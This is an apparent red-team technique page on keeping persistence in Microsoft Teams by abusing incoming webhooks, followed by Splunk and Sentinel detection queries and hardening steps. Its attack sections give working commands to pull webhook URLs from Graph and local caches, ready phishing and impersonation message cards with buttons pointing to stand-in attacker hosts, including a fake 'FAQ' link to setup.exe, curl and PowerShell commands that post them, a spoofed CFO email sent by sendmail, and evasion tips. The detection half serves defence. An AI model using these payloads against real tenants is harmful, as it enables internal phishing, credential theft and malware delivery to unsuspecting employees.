# [PERSIST-SERVER-004]: Teams Webhook Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SERVER-004 |
| **MITRE ATT&CK v18.1** | [T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) |
| **Tactic** | Persistence |
| **Platforms** | M365 |
| **Severity** | High |
| **CVE** | N/A (Design flaw; no authentication required) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Microsoft Teams versions (Web, Desktop, Mobile) |
| **Patched In** | N/A (Microsoft MSRC closed without fix as of Jan 2024) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Teams Incoming Webhooks (Connectors) allow external systems to post messages to Teams channels without authentication. An attacker who discovers or extracts a webhook URL can send arbitrary messages to the channel appearing as a legitimate connector application, even after losing access to the organization's Teams account. Webhook URLs persist indefinitely unless explicitly deleted by a team owner, and by default, users can configure webhooks in any channel they access. This creates a **persistent backdoor**: even if an attacker's account is disabled or passwords are reset, the webhook URL remains valid and can be used to send phishing messages, impersonate applications, post malware links, or conduct social engineering attacks directly within the organization's Teams infrastructure.

**Attack Surface:** Teams Incoming Webhook URLs, Connector configurations, Channel message posting APIs, Message card JSON payloads (for crafting phishing/impersonation content).

**Business Impact:** **Persistent Command & Control / Social Engineering Channel.** An attacker maintains indefinite access to post messages to Teams channels appearing as legitimate connectors. This enables:
- Internal phishing campaigns (fake IT alerts, CEO requests)
- Malware distribution (links disguised as legitimate documents)
- Credential harvesting (fake login prompts via message cards)
- Impersonation of legitimate integrations (GitHub, Jira, ServiceNow)
- Psychological manipulation (social engineering)

**Technical Context:** Exploitation requires 5-10 minutes with initial Teams access (or a leaked webhook URL). Detection likelihood is **Medium** if Teams message auditing and connector usage logs are reviewed. However, messages posted via webhooks appear legitimate and can blend in with normal channel traffic.

### Operational Risk
- **Execution Risk:** Very Low (only needs webhook URL; no tools or special access required)
- **Stealth:** High (Messages appear as connector apps; can mimic legitimate integrations)
- **Reversibility:** No (Webhook persists until team owner explicitly deletes it)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.2.4 | Ensure that external access is restricted |
| **DISA STIG** | M365-1-1 | Configure message retention and archiving |
| **CISA SCuBA** | CA-2(1) | Automated Detection and Prevention Controls |
| **NIST 800-53** | AC-2(3), AU-2 | Incident Monitoring and Unauthorized Access Detection |
| **GDPR** | Art. 32 | Security Measures; Unauthorized Access Logging |
| **DORA** | Art. 18 | Testing and Monitoring of Security Controls |
| **NIS2** | Art. 21(f) | Incident Response and Forensics |
| **ISO 27001** | A.6.1.3, A.9.2.3 | Access Control; Monitoring and Logging |
| **ISO 27005** | Section 7 | Risk Assessment - Unauthorized Message Posting |

---

## 2. Technical Prerequisites

- **Required Privileges:** User-level access to any Teams channel (to discover/extract webhook URLs); OR knowledge of webhook URL from previous compromise.
- **Required Access:** Network access to Teams (https://teams.microsoft.com/api/*); ability to send HTTP POST requests.
- **Supported Versions:** All Microsoft Teams versions (Web, Desktop client 1.0-2.x, Mobile).
- **Tools Required:**
  - `curl` or `Invoke-WebRequest` (for sending webhook payloads)
  - [Black Hills TeamsPhisher](https://github.com/BlackHillsInfoSecurity/TeamsPhisher) (optional, for advanced payload crafting)
  - JSON editor or text editor (for crafting message cards)
  - Python 3.7+ (if building custom payload generators)

---

## 3. Detailed Execution Methods and Their Steps

### METHOD 1: Webhook URL Discovery and Message Injection via PowerShell

**Supported Versions:** All Teams versions

**Prerequisites:** User access to Teams channels; ability to view connector configurations (channel owner/team owner privileges, or leaked webhook URL).

#### Step 1: Discover Webhook URLs from Compromised Teams Channel

**Objective:** Extract existing webhook URLs from a channel, which persist even after account compromise or credential resets.

**Command (Via Teams Admin Center - Requires Owner Access):**
```powershell
# Connect to Teams PowerShell
Connect-MicrosoftTeams

# Get all teams and their channels
$teams = Get-Team

foreach ($team in $teams) {
    Write-Host "Team: $($team.DisplayName)"
    
    # Get all channels in the team
    $channels = Get-TeamChannel -GroupId $team.GroupId
    
    foreach ($channel in $channels) {
        Write-Host "  Channel: $($channel.DisplayName)"
        
        # Get channel configuration (may reveal webhook details in some cases)
        # Note: MS PowerShell doesn't expose webhook URLs directly; must check via API
    }
}
```

**Command (Via Graph API - Extract Webhook URLs):**
```bash
# Authenticate and get access token
TOKEN=$(az account get-access-token --resource "https://graph.microsoft.com" --query "accessToken" -o tsv)

# List all Teams
curl -s "https://graph.microsoft.com/v1.0/teams" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[].id'

# For each team, list channels and connectors
TEAM_ID="12345678-1234-1234-1234-123456789012"
curl -s "https://graph.microsoft.com/v1.0/teams/$TEAM_ID/channels" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[].id'

# Get channel configuration (webhooks may be visible via configuration)
# Note: Graph API for webhooks is limited; direct URL extraction requires Teams Web client access
```

**Alternative - Web Scraping (If Webhook URLs are Visible in Channel Settings):**
```bash
# Access the Teams web client and extract webhook from DevTools
# Webhooks are configured at: https://teams.microsoft.com/v2/channels/{channelId}/tabs

# Or, check Team's configuration files if attacker has local file system access
# Windows: %APPDATA%\Microsoft\Teams\Cache\
# Linux: ~/.config/microsoft-teams/Cache/

grep -r "webhook.office.com" ~/.config/microsoft-teams/Cache/ 2>/dev/null
```

**Expected Output:**
```
https://outlook.webhook.office.com/webhookb2/XXXXX-XXXXX-XXXXX/IncomingWebhook/XXXXXXX/XXXXXXX
```

**What This Means:**
- The webhook URL is a permanent, unauthenticated POST endpoint.
- Attacker can use this URL to post messages to the channel indefinitely.
- The URL persists even if the user who created it is removed from the organization.
- No authentication headers are required.

**OpSec & Evasion:**
- Viewing webhook configurations may generate audit logs (depending on tenant logging settings).
- Detection likelihood: **Low** (unless webhook audit logging is explicitly enabled)

**References & Proofs:**
- [Black Hills InfoSec: Webhook Phishing in Teams](https://www.blackhillsinfosec.com/wishing-webhook-phishing-in-teams/)
- [Office 365 IT Pros: Incoming Webhook Connector Abuse](https://office365itpros.com/2024/03/18/incoming-webhook-connector-abuse/)

#### Step 2: Craft Malicious Message Card (JSON Payload)

**Objective:** Create a message card that mimics a legitimate Teams connector (e.g., GitHub, Jira, ServiceNow) to deceive users.

**Command (Create Phishing Message Card):**
```bash
# Phishing message card (appears as "GitHub" connector)
cat > phishing_payload.json << 'EOF'
{
  "@type": "MessageCard",
  "@context": "https://schema.org/extensions",
  "summary": "Security Alert",
  "themeColor": "0078D4",
  "title": "🔒 Urgent: Verify Your Microsoft 365 Account",
  "sections": [
    {
      "activityTitle": "Microsoft 365 Security Team",
      "activitySubtitle": "Suspicious Activity Detected",
      "text": "Your account has been flagged for unusual sign-in activity. Please verify your identity immediately by clicking the button below.",
      "potentialAction": [
        {
          "@type": "OpenUri",
          "name": "Verify Account",
          "targets": [
            {
              "os": "default",
              "uri": "https://attacker-phishing-site.com/login.html"
            }
          ]
        }
      ]
    }
  ]
}
EOF

# Read the JSON (for use in curl)
PAYLOAD=$(cat phishing_payload.json | jq -c .)
```

**Command (Create Impersonation Message Card - Fake Application):**
```json
{
  "@type": "MessageCard",
  "@context": "https://schema.org/extensions",
  "summary": "Build Status",
  "themeColor": "28a745",
  "title": "✅ Build Pipeline - Main Branch",
  "@from": "Azure DevOps",
  "sections": [
    {
      "activityTitle": "Pipeline Completed",
      "activitySubtitle": "Merge request approved",
      "text": "Your pull request has been merged. **Attention:** An urgent security patch has been deployed. Click below to review deployment logs.",
      "potentialAction": [
        {
          "@type": "OpenUri",
          "name": "View Logs",
          "targets": [
            {
              "os": "default",
              "uri": "https://attacker-c2-server.com/logs?token=EXFIL"
            }
          ]
        }
      ]
    }
  ]
}
```

**What This Means:**
- Message cards use JSON format for rich formatting (colors, buttons, images).
- Attackers can craft messages that appear to originate from legitimate connectors (GitHub, Jira, Azure DevOps, etc.).
- Action buttons can direct users to attacker-controlled phishing sites or C2 servers.
- No way to distinguish webhook-posted messages from legitimate connector messages in the Teams UI (as of Jan 2024).

**OpSec & Evasion:**
- Message cards can be crafted to match the visual style of legitimate integrations.
- Detection likelihood: **Medium** (if users examine sender details or Team owners audit webhook history)

#### Step 3: Send Malicious Payload to Teams Webhook

**Objective:** Post the crafted message card to the channel using the webhook URL.

**Command (Send Phishing Message via Webhook):**
```bash
WEBHOOK_URL="https://outlook.webhook.office.com/webhookb2/XXXXX/IncomingWebhook/XXXXX/XXXXX"

# Create minimal payload
curl -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "@type": "MessageCard",
    "@context": "https://schema.org/extensions",
    "summary": "Alert",
    "themeColor": "0078D4",
    "title": "⚠️  Security: Verify Your Identity Now",
    "sections": [
      {
        "text": "Click below to confirm your account details",
        "potentialAction": [
          {
            "@type": "OpenUri",
            "name": "Verify Now",
            "targets": [
              {"os": "default", "uri": "https://phishing-site.attacker.com/verify"}
            ]
          }
        ]
      }
    ]
  }'
```

**Command (Send via PowerShell):**
```powershell
$webhook = "https://outlook.webhook.office.com/webhookb2/XXXXX/IncomingWebhook/XXXXX/XXXXX"

$payload = @{
    "@type" = "MessageCard"
    "@context" = "https://schema.org/extensions"
    "summary" = "Security Alert"
    "themeColor" = "0078D4"
    "title" = "🔒 Urgent Account Verification Required"
    "sections" = @(
        @{
            "activityTitle" = "Microsoft 365 Security Team"
            "text" = "Unusual login activity detected. Verify your identity now."
            "potentialAction" = @(
                @{
                    "@type" = "OpenUri"
                    "name" = "Verify Account"
                    "targets" = @(
                        @{"os" = "default"; "uri" = "https://attacker-phishing.com/login"}
                    )
                }
            )
        }
    )
}

Invoke-WebRequest -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json -Depth 5) -ContentType "application/json"
```

**Expected Output:**
```
1
```

A response of `1` indicates the message was posted successfully.

**What This Means:**
- The phishing/impersonation message is now visible to all channel members.
- Users will see the message as coming from the configured connector app (e.g., "GitHub", "Jira").
- Clicking the button directs users to the attacker's phishing site or C2 server.
- The attacker can repeat this indefinitely without re-authentication.

**OpSec & Evasion:**
- Messages posted via webhooks are logged in Teams Audit Logs (if enabled), but appear as normal posts.
- Attackers can throttle message frequency (once per day) to avoid suspicion.
- Detection likelihood: **Medium-High** (if Team owners review audit logs or message sender details)

**References & Proofs:**
- [Check Point Research: Teams Impersonation Vulnerabilities](https://research.checkpoint.com/2025/microsoft-teams-impersonation-and-spoofing-vulnerabilities-exposed/)
- [Microsoft: MessageCard JSON Schema](https://learn.microsoft.com/en-us/outlook/actionable-messages/send-via-connectors)

#### Step 4: Escalate via Message Card Actions (Credential Harvesting)

**Objective:** Use message card action buttons to capture credentials or trigger downloads.

**Command (Create Credential Harvesting Card):**
```json
{
  "@type": "MessageCard",
  "@context": "https://schema.org/extensions",
  "summary": "Password Reset Required",
  "themeColor": "ff0000",
  "title": "⚠️  Action Required: Password Reset",
  "sections": [
    {
      "text": "Your Microsoft 365 password will expire in 24 hours. Please update it immediately to maintain access.",
      "potentialAction": [
        {
          "@type": "OpenUri",
          "name": "Reset Password",
          "targets": [
            {
              "os": "default",
              "uri": "https://attacker-phishing-site.com/reset-password?user=$(whoami)&org=$(hostname)"
            }
          ]
        },
        {
          "@type": "OpenUri",
          "name": "FAQ",
          "targets": [
            {
              "os": "default",
              "uri": "https://attacker-c2-server.com/download/setup.exe"
            }
          ]
        }
      ]
    }
  ]
}
```

**What This Means:**
- Message cards can include multiple action buttons leading to different malicious sites.
- Users may click "FAQ" thinking it's harmless, downloading malware disguised as legitimate documentation.
- Credential harvesting page captures username/password combinations.
- All clicks are tracked by the attacker's server.

---

### METHOD 2: Webhook URL Extraction from Teams Local Cache

**Supported Versions:** Teams Desktop Client (Windows, Mac, Linux)

**Prerequisites:** Local or remote access to the endpoint running Teams desktop client.

**Objective:** Extract webhook URLs from Teams local storage, enabling persistence even if the attacker loses network access.

**Command (Windows - Extract from Cache):**
```powershell
# Teams stores webhook URLs in the local cache
$teamsPath = "$env:APPDATA\Microsoft\Teams\Cache"

# Search for webhook URLs in cached files
Get-ChildItem -Path $teamsPath -Recurse -Filter "*.json" | 
  ForEach-Object { 
    Select-String -Path $_.FullName -Pattern "webhook.office.com" -ErrorAction SilentlyContinue
  }

# Alternative: Extract from Indexed DB (Teams Web storage)
# Location: $env:APPDATA\Microsoft\Teams\IndexedDB\
dir "$env:APPDATA\Microsoft\Teams\IndexedDB" /s | findstr webhook
```

**Command (Mac/Linux - Extract from Cache):**
```bash
# Mac
grep -r "webhook.office.com" ~/Library/Application\ Support/Microsoft/Teams/Cache/

# Linux
grep -r "webhook.office.com" ~/.config/microsoft-teams/Cache/

# Alternative: Check Teams configuration files
cat ~/.config/microsoft-teams/app.json | grep -i webhook
```

**Expected Output:**
```
https://outlook.webhook.office.com/webhookb2/12345678-1234-1234/IncomingWebhook/6789ABCDEF/0123456789
```

**What This Means:**
- Teams caches webhook URLs locally for quick reference.
- An attacker with local/remote code execution can extract and reuse webhook URLs.
- This provides long-term persistence independent of the original Teams user account.

**OpSec & Evasion:**
- Extracting local files may generate file system access logs (Windows Event ID 4656).
- Detection likelihood: **Medium** (if EDR or file integrity monitoring is enabled)

---

### METHOD 3: Channel Email Address Abuse for Webhook Persistence

**Supported Versions:** All Teams versions

**Prerequisites:** Knowledge of Teams channel email address (format: `ChannelName@TeamName.teams.microsoft.com`); ability to send emails.

**Objective:** Use Teams channel email addresses as an alternative persistence mechanism.

**Command (Send Phishing Email to Channel):**
```bash
# Teams channels can receive emails; messages appear in the channel as if posted by email sender
# This can be abused to send phishing emails to a Teams channel

# Step 1: Discover channel email address
# (Usually visible in channel settings, or can be inferred from pattern)
CHANNEL_EMAIL="Sales-Announcements@CompanyName.teams.microsoft.com"

# Step 2: Craft phishing email
cat > phishing_email.txt << 'EOF'
From: fake-cfo@company.com
To: Sales-Announcements@CompanyName.teams.microsoft.com
Subject: Urgent: Salary Review Process - Action Required

Hi Team,

Please review your salary information and click below to confirm details:

https://attacker-phishing-site.com/salary-review

Best regards,
CFO Office
EOF

# Step 3: Send via SMTP (if external SMTP is available)
sendmail -t < phishing_email.txt
```

**What This Means:**
- Emails sent to channel addresses appear as messages in the channel.
- External attackers can send emails to channel addresses (if not restricted).
- Messages appear legitimate (as emails from external senders).
- Provides persistence if webhook URLs are not available.

**OpSec & Evasion:**
- Email traffic is logged in Exchange Online mail flow logs.
- Detection likelihood: **High** (if mail flow rules are configured to flag external emails to channel addresses)

---

## 4. Splunk Detection Rules

#### Rule 1: Suspicious Teams Webhook Message Posts

**Rule Configuration:**
- **Required Index:** teams_audit, o365_management
- **Required Sourcetype:** MicrosoftTeams:Audit
- **Required Fields:** Operation, UserId, TeamId, ChannelId, Properties
- **Alert Threshold:** >10 messages from same webhook URL in 1 hour
- **Applies To Versions:** All Teams versions

**SPL Query:**
```spl
index=teams_audit Operation=PostMessage TargetObject="*webhook*"
| stats count by TargetObject, UserId, TeamId
| where count > 10
```

**What This Detects:**
- Abnormal message posting frequency from webhook connectors.
- Identifies suspicious connectors posting multiple messages.
- Correlates with potential social engineering campaigns.

**Manual Configuration Steps:**
1. Log into Splunk → **Settings** → **Searches, reports, and alerts**
2. Click **New Alert**
3. Paste the SPL query above
4. Set **Trigger Condition** to "when count > 10"
5. Configure **Action** → Send email/alert to security team

#### Rule 2: Webhook URL Discovery or Modification

**Rule Configuration:**
- **Required Index:** o365_management
- **Required Sourcetype:** AuditLog
- **Required Fields:** Operation, UserId, ObjectId
- **Alert Threshold:** Any occurrence of webhook configuration changes
- **Applies To Versions:** All

**SPL Query:**
```spl
index=o365_management Operation IN ("AddConnector", "UpdateConnector", "RemoveConnector") 
  OR search="*webhook*"
| fields _time, Operation, UserId, ObjectId
```

**What This Detects:**
- Teams connector creation, modification, or deletion events.
- Identifies which user configured webhooks (for incident investigation).
- Alerts on suspicious connector changes.

---

## 5. Microsoft Sentinel Detection

#### Query 1: Abnormal Message Activity from Teams Webhooks

**Rule Configuration:**
- **Required Table:** TeamsAuditLogs, MicrosoftTeamsActivity
- **Required Fields:** Operation, MessageType, SenderType, ChannelId
- **Alert Severity:** High
- **Frequency:** Every 10 minutes
- **Applies To Versions:** All Teams versions

**KQL Query:**
```kusto
TeamsAuditLogs
| where Operation == "PostMessage"
| where tostring(Properties) contains "webhook" or tostring(Properties) contains "connector"
| summarize MessageCount=count() by ChannelId, TimeGenerated
| where MessageCount > 10
| project TimeGenerated, ChannelId, MessageCount
```

**What This Detects:**
- Excessive message posting from webhook connectors.
- Identifies channels being targeted for phishing campaigns.
- Correlates timing with potential social engineering attacks.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Abnormal Teams Webhook Message Activity`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

## 6. Defensive Mitigations

#### Priority 1: CRITICAL

*   **Audit and Document All Webhook Connectors:** Regularly review which webhooks are configured in Teams channels and verify they are legitimate and actively maintained.
    **Applies To Versions:** All
    
    **Manual Steps (Teams Admin Center):**
    1. Go to **Teams Admin Center** → **Teams** (left menu)
    2. For each team, click **Manage team**
    3. Go to **Channels** → Select each channel
    4. Check **Connectors** tab for configured webhooks
    5. Document owner, creation date, and purpose
    6. Delete any unused or unknown webhooks
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Connect to Teams
    Connect-MicrosoftTeams
    
    # Get all teams and their webhooks
    $teams = Get-Team
    foreach ($team in $teams) {
        $channels = Get-TeamChannel -GroupId $team.GroupId
        foreach ($channel in $channels) {
            Write-Host "Team: $($team.DisplayName) | Channel: $($channel.DisplayName)"
            # Note: PowerShell doesn't expose webhooks directly; must use Teams Web UI
        }
    }
    ```

*   **Disable Webhook Connectors Organization-Wide if Not Needed:** If Teams webhooks are not actively used, disable them to eliminate this persistence vector entirely.
    **Applies To Versions:** All
    
    **Manual Steps (Teams Admin Center):**
    1. Go to **Teams Admin Center** → **Teams apps** → **Manage apps** (left menu)
    2. Search for **Incoming Webhook** or **Connectors**
    3. Click the app → **Unblock** (to view details)
    4. Click **Block** to prevent new webhook creation organization-wide
    5. Note: Existing webhooks will continue to work; administrators must manually delete them
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Block Teams Connector app
    Update-TeamsApp -Identity "0d820ecd-def2-4297-adad-78056cde7c78" -Blocked $true
    ```

*   **Enable Teams Audit Logging:** Ensure all Teams activities (including webhook posts) are logged for review.
    **Applies To Versions:** All
    
    **Manual Steps (Compliance Center):**
    1. Go to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
    2. Click **Audit** (left menu)
    3. If not enabled, click **Turn on auditing**
    4. Verify these audit categories are enabled:
       - **Teams & Channels activities**: Enable
       - **Teams Chat activities**: Enable
       - **Teams Administration activities**: Enable
    5. Retention period: Set to **365 days** (or per compliance requirement)
    6. Click **Save**

*   **Implement Teams Message Retention Policies:** Automatically delete suspicious messages or messages from external connectors after a set retention period.
    **Applies To Versions:** All
    
    **Manual Steps (Teams Admin Center):**
    1. Go to **Teams Admin Center** → **Messaging policies** (left menu)
    2. Click **+ Add new policy**
    3. Name: `Restrict Webhook Messages`
    4. **Message retention:**
       - Retain messages for: `30 days`
       - Permanently delete**: Enable
    5. Apply to: Select all teams or specific high-risk teams
    6. Click **Save**

#### Priority 2: HIGH

*   **Restrict Webhook Connector Permissions:** Only team owners (not regular members) should be able to create webhooks.
    **Applies To Versions:** All (with conditional restrictions)
    
    **Manual Steps (Teams Admin Center):**
    1. Go to **Teams Admin Center** → **Teams apps** → **Manage apps**
    2. Search **Incoming Webhook**
    3. Click **Incoming Webhook**
    4. Under **Org-wide app settings**, set:
       - **Allow this app to be used**: Yes (keep for necessary use)
       - **Allow this app in meetings**: No
       - **Allow pinning**: No
    5. Under **Permission policies**, restrict to:
       - **Allow list**: Specific security team or admin group only
    6. Click **Save**

*   **Monitor Webhook URL Leakage:** Implement detection for webhook URLs appearing in emails, chat, or external communications.
    **Manual Steps:**
    1. Configure **Data Loss Prevention (DLP) policies** to flag webhook URLs
    2. Go to **Microsoft Purview Compliance Portal** → **Data Loss Prevention** → **Policies**
    3. Create new policy:
       - Name: `Block Webhook URL Leakage`
       - Locations: Teams, Email, OneDrive
       - Content contains: Pattern `webhook.office.com`
       - Action: **Notify user** and **Block**
    4. Click **Save**

*   **Enable MFA and Conditional Access for Webhook Management:** Restrict webhook creation to specific devices/networks.
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Restrict Teams Webhook Configuration`
    4. **Assignments:**
       - Users: All (or specific admin group)
       - Cloud apps: **Microsoft Teams**
       - Actions: **Manage connectors/webhooks** (if available)
    5. **Conditions:**
       - Locations: **Exclude trusted networks** OR **Require MFA**
    6. **Access controls:**
       - Grant: **Require MFA** and **Require compliant device**
    7. Enable: **On**
    8. Click **Create**

#### Access Control & Policy Hardening

*   **RBAC/ABAC:** Only team owners and designated security admins should have permission to manage webhooks.
    **Manual Steps:**
    1. In Teams, for each team, go to **Settings** → **Members** (left menu)
    2. Review who has **Owner** role
    3. Remove unnecessary owners
    4. For webhook management, assign specific users **Security Admin** role:
       - Go to **Teams Admin Center** → **Roles & permissions**
       - Create custom role: `Webhook Manager`
       - Assign to security team only

*   **Conditional Access:** Block webhook configuration from non-corporate networks or non-compliant devices.
    **Manual Steps:** (See Priority 2 steps above)

#### Validation Command (Verify Fix)

```powershell
# Check if Teams audit logging is enabled
$auditStatus = Get-UnifiedAuditLogRetentionPolicy
Write-Host "Audit Logging Enabled: $($auditStatus.Enabled)"

# List all configured webhooks in Teams (requires admin)
# Note: Direct PowerShell export not available; must use Teams Admin Center UI

# Check DLP policies for webhook URL patterns
Get-DlpCompliancePolicy | Where-Object {$_.ContentContains -like "*webhook*"} | Select-Object Name, Description

# Check Conditional Access policy for Teams webhook restrictions
Get-ConditionalAccessPolicy | Where-Object {$_.DisplayName -like "*Webhook*"} | Select-Object DisplayName, State
```

**Expected Output (If Secure):**
```
Audit Logging Enabled: True
DLP Policy Name: Block Webhook URL Leakage (Active)
No unauthorized webhooks found in Teams channels
Conditional Access enforcing MFA for webhook configuration
```

**What to Look For:**
- Audit logging should be enabled organization-wide
- No unknown or uncategorized webhooks in Teams channels
- All webhook configurations should be owned by verified security/admin accounts
- Regular audit of webhook usage (weekly review recommended)

---

## 7. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing | Attacker gains initial access via phishing email |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-002] Exchange Admin Escalation | Escalate to Teams admin via role manipulation |
| **3** | **Current Step** | **[PERSIST-SERVER-004]** | **Teams Webhook Persistence - Create backdoor webhook** |
| **4** | **Command & Control** | Phishing/Social Engineering via Teams | Use webhooks to send fake IT alerts, CEO requests |
| **5** | **Lateral Movement** | [LM-AUTH-013] EWS Impersonation | Escalate to mailbox access via compromised tokens |
| **6** | **Impact** | Data exfiltration, ransomware deployment, credential harvesting |

---

## 8. Real-World Examples

#### Example 1: Storm-2603 (SharePoint + Teams Attack Chain)

- **Target:** Organizations using SharePoint and Teams
- **Timeline:** 2024-2025
- **Technique Status:** Storm-2603 exploited SharePoint vulnerabilities to gain initial access, then leveraged Teams webhooks for persistence and command & control. They posted malicious messages appearing as legitimate system alerts.
- **Impact:** Credential theft; lateral movement to multiple Teams; C2 channel for malware deployment
- **Reference:** [Microsoft: Disrupting Active Exploitation of SharePoint Vulnerabilities](https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/)

#### Example 2: Teams Webhook Phishing Campaigns (Generic)

- **Target:** Enterprise organizations (all sectors)
- **Timeline:** 2023-2025
- **Technique Status:** Multiple campaigns observed using Teams webhooks to distribute phishing messages impersonating IT departments, HR, and executives. Black Hills InfoSec disclosed findings in January 2024; Microsoft did not fix.
- **Impact:** Credential harvesting; malware distribution; social engineering at scale
- **Reference:** [Black Hills InfoSec: Webhook Phishing in Teams](https://www.blackhillsinfosec.com/wishing-webhook-phishing-in-teams/)

---

## References & Additional Resources

- [Black Hills InfoSec: Webhook Phishing in Teams](https://www.blackhillsinfosec.com/wishing-webhook-phishing-in-teams/)
- [Office 365 IT Pros: Incoming Webhook Connector Abuse](https://office365itpros.com/2024/03/18/incoming-webhook-connector-abuse/)
- [Microsoft: Disrupting Teams Threats](https://www.microsoft.com/en-us/security/blog/2025/10/07/disrupting-threats-targeting-microsoft-teams/)
- [Check Point Research: Teams Impersonation and Spoofing](https://research.checkpoint.com/2025/microsoft-teams-impersonation-and-spoofing-vulnerabilities-exposed/)
- [FocusedHunts: Hunting Microsoft Teams Threats](https://www.focusedhunts.com/blog/hunting-off-the-red/Hunting-Microsoft-Teams-Threats-Detection-Guide.html)
- [Vectra: Undermining Teams Security by Mining Tokens](https://www.vectra.ai/blog/undermining-microsoft-teams-security-by-mining-tokens)
- [Microsoft: MessageCard JSON Schema Documentation](https://learn.microsoft.com/en-us/outlook/actionable-messages/send-via-connectors)

---